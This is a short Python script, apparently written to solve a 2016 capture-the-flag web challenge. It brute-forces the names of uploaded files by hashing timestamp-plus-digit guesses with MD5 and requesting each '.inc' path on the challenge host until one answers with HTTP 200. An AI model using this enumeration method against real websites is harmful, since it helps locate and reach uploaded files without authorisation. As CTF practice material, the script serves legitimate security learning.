__author__ = 'angelwhu'
import hashlib
import requests

session = requests.Session()

def md5(src):
    m2 = hashlib.md5()
    m2.update(src)
    return m2.hexdigest()

def go():

    headers = {"Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}
    #time = 1463823351
    #time = 146382757434
    time = 1463832477
    for i in range (-1,10):
        for j in range(9,100):
            f = str(time + i) + str(j)
            #print f
            filename = md5(f) + ".inc"
            #url = "http://localhost/ctfs/SGBM_20160521/uploads/2016/05/" + filename
            url = "http://4e79618700b44607c.jie.sangebaimao.com/uploads/2016/05/" + filename
            response = session.get(url, headers=headers,allow_redirects=False,timeout = 0.5)
            #print url

            if response.status_code == 200:
                #print testIp + str(i) +  ":" + str(response.status_code)
                print url
                print f
                exit();
            #else:
                #print testIp +  str(i) + ":" + str(response.status_code)

if __name__ == "__main__":
    go()
